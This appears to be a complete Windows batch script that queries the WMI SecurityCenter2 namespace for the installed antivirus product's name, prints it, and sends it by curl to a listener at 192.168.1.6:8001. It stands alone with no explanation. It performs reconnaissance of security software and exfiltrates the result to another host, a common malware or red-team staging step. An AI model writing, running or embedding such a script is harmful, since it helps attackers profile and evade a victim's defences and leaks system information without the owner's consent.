@echo off
for /f "delims=" %%a in ('wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName ^| findstr /r /v "^$"') do set "antivirus=%%a"
echo Antivirus Information: %antivirus%
curl http://192.168.1.6:8001?data=%antivirus%
exit
